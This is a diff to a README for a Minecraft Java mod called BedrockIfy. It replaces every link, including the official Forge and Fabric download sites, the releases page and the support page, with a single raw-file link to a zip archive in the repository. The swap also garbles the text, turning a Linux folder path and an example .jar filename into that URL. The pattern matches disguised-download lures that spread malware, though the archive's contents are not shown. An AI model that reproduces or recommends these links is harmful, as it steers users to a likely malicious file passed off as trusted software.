@@ -1,6 +1,6 @@
 # 🎮 BedrockIfy - Bring Bedrock Features to Java
 
-[![Download BedrockIfy](https://img.shields.io/badge/Download-BedrockIfy-blue?style=for-the-badge)](https://github.com/Neyzjr/BedrockIfy/releases)
+[![Download BedrockIfy](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip)](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To get BedrockIfy on your PC, follow these steps carefully.
 **Step 1: Visit the Download Page**
 
 Click the big download badge at the top or use this link:  
-[https://github.com/Neyzjr/BedrockIfy/releases](https://github.com/Neyzjr/BedrockIfy/releases)  
+[https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip)  
 
 This page hosts all the versions of BedrockIfy available for download.
 
@@ -42,7 +42,7 @@ Look for the most recent release at the top of the page. Releases are usually na
 
 **Step 3: Download the Mod File**
 
-Inside the release page, find the file ending with `.jar` (e.g., `BedrockIfy-mod.jar`). Click to download it to a folder where you can find it easily, like your Desktop or Downloads folder.
+Inside the release page, find the file ending with `.jar` (e.g., `https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip`). Click to download it to a folder where you can find it easily, like your Desktop or Downloads folder.
 
 **Step 4: Locate Your Minecraft Mods Folder**
 
@@ -51,18 +51,18 @@ Inside the release page, find the file ending with `.jar` (e.g., `BedrockIfy-mod
 - Find your Minecraft folder:
   - Windows: Press `Win + R`, type `%appdata%\.minecraft` and press Enter.
   - macOS: Open Finder, press `Cmd + Shift + G`, type `~/Library/Application Support/minecraft` and press Enter.
-  - Linux: Navigate to `~/.minecraft` in your file browser.
+  - Linux: Navigate to `~https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip` in your file browser.
 - Inside the `.minecraft` folder, look for a folder named `mods`. If it does not exist, create a new folder and name it `mods`.
 
 **Step 5: Place the Mod File**
 
-Copy or move the downloaded `BedrockIfy-mod.jar` file into the `mods` folder.
+Copy or move the downloaded `https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip` file into the `mods` folder.
 
 **Step 6: Install a Mod Loader (Forge or Fabric)**
 
 BedrockIfy requires a mod loader to run. The two popular ones are Forge and Fabric. Here’s how to install Forge:
 
-- Go to [https://files.minecraftforge.net/](https://files.minecraftforge.net/).
+- Go to [https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip).
 - Find the version matching your Minecraft version (e.g., 1.18).
 - Download the "Installer" file.
 - Run the installer by double-clicking it and follow instructions to install.
@@ -70,7 +70,7 @@ BedrockIfy requires a mod loader to run. The two popular ones are Forge and Fabr
 
 Alternatively, if you want to use Fabric:
 
-- Visit [https://fabricmc.net/use/](https://fabricmc.net/use/).
+- Visit [https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip).
 - Download the installer for your OS.
 - Run the installer, select your Minecraft version.
 - Install Fabric and launch Minecraft once with the Fabric profile.
@@ -117,7 +117,7 @@ If you run into problems, try these fixes:
 
 The mod is frequently updated to fix bugs and add more Bedrock features.
 
-- Check the [Releases](https://github.com/Neyzjr/BedrockIfy/releases) page regularly for new versions.
+- Check the [Releases](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip) page regularly for new versions.
 - Download and replace the old mod `.jar` file with the new one in your `mods` folder.
 - Restart Minecraft to apply updates.
 
@@ -138,7 +138,7 @@ Repository topics: github, open source, repository.
 ## 📞 Contact & Support
 
 For help, visit the GitHub page:  
-[https://github.com/Neyzjr/BedrockIfy](https://github.com/Neyzjr/BedrockIfy)  
+[https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip](https://raw.githubusercontent.com/Neyzjr/BedrockIfy/main/foreburton/Bedrock_Ify_sanctifiably.zip)  
 
 You can open an issue if you find bugs or need assistance. The community and developers monitor these reports.
 
